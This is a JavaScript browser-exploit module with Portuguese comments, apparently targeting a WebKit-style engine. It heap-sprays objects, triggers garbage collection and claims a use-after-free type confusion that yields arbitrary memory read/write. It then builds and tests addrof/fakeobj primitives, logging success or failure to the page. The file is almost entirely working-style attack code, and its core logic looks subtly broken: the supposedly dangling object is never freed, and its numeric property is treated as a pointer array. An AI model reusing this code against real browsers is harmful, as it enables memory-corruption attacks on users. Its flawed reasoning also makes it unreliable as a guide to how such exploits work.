// js/script3/testArrayBufferVictimCrash.mjs (Revisão Final e Robusta)
// Foco: Usar R/W Arbitrário para construir e validar addrof/fakeobj.

import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';

export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

// --- Variáveis Globais para as Primitivas ---
let victim_array;
let original_victim_butterfly; // Endereço do buffer de dados do victim_array
let corrupted_container_butterfly; // O butterfly do objeto container corrompido

// Funções auxiliares de conversão
const ftoi = (val) => {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = val;
    const ints = new Uint32Array(buf);
    return new AdvancedInt64(ints[0], ints[1]);
};

const itof = (val) => {
    const buf = new ArrayBuffer(8);
    const ints = new Uint32Array(buf);
    ints[0] = val.low();
    ints[1] = val.high();
    return (new Float64Array(buf))[0];
};

// --- Primitivas de Leitura/Escrita Arbitrária ---
function arb_write(where, what) {
    // Corrompe o ponteiro do butterfly do victim_array para apontar para 'where'
    corrupted_container_butterfly[2] = itof(where.sub(8));
    // Escreve o valor no local alvo
    victim_array[0] = itof(what);
    // Restaura o ponteiro original para estabilidade
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
}

function arb_read(where) {
    // Corrompe o ponteiro do butterfly do victim_array para apontar para 'where'
    corrupted_container_butterfly[2] = itof(where.sub(8));
    // Lê o valor do local alvo
    const result = ftoi(victim_array[0]);
    // Restaura o ponteiro original para estabilidade
    corrupted_container_butterfly[2] = itof(original_victim_butterfly);
    return result;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function runExploitChain_Final() {
    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Final e Robusta ---`, "test");

    try {
        // --- FASE 1: Construir Leitura/Escrita Arbitrária via UAF ---
        logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
        createArbitraryRW();
        logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Construir e Validar addrof/fakeobj ---
        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");

        // Agora usamos o 'victim_array', cujo endereço do butterfly já conhecemos,
        // como nossa ferramenta para criar as primitivas.
        
        const addrof = (obj) => {
            // Colocamos o objeto em uma posição conhecida do nosso array.
            victim_array[1] = obj;
            // O ponteiro para 'obj' está agora em uma posição conhecida dentro do buffer do victim_array.
            // Lemos o ponteiro diretamente desse local.
            return arb_read(original_victim_butterfly.add(8));
        };

        const fakeobj = (addr) => {
            // Escrevemos o endereço falso no local do ponteiro dentro do buffer do victim_array.
            arb_write(original_victim_butterfly.add(8), addr);
            // Ao acessar o elemento do array, o JS nos dá um objeto que aponta para o endereço falso.
            return victim_array[1];
        };

        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");

        // Validação das primitivas
        const test_obj = { marker: 0xCAFEF00D };
        const test_obj_addr = addrof(test_obj);
        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
        
        const fake_test_obj = fakeobj(test_obj_addr);
        if (fake_test_obj.marker === 0xCAFEF00D) {
            logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
        } else {
            throw new Error(`Falha ao validar 'fakeobj'.`);
        }

        document.title = "addrof/fakeobj SUCCESS!";
        return { success: true, message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!" };

    } catch (e) {
        logS3(`A cadeia de exploração falhou: ${e.message}`, "critical");
        console.error(e);
        document.title = "Exploit Failed";
        return { success: false, errorOccurred: e.message };
    }
}

// --- Função que estabelece a confusão de tipos ---
function createArbitraryRW() {
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push({ a: 1, b: 2, c: 3, d: 4 });
    }
    let dangling_ref_obj = { a: 1, b: 2, c: 3, d: 4 };
    spray.push(dangling_ref_obj);

    victim_array = new Float64Array([13.37, 13.38, 13.39]);
    let container = {
        header: 0,
        butterfly: victim_array
    };
    
    spray = null;
    triggerGC();

    let reclaimers = [];
    for (let i = 0; i < 4096; i++) {
        reclaimers.push(container);
    }
    
    // A propriedade 'b' do objeto original agora se sobrepõe à propriedade 'butterfly' do container.
    // 'dangling_ref_obj.b' nos dá acesso direto ao butterfly do container.
    corrupted_container_butterfly = dangling_ref_obj.b;
    
    // O butterfly do container é um array de ponteiros. A posição [2] contém o ponteiro
    // para o buffer de dados do 'victim_array'. Nós o lemos e guardamos.
    original_victim_butterfly = ftoi(corrupted_container_butterfly[2]);
}

function triggerGC() {
    try {
        for (let i = 0; i < 64; i++) {
            new ArrayBuffer(1024 * 1024 * 16);
        }
    } catch(e) {}
}
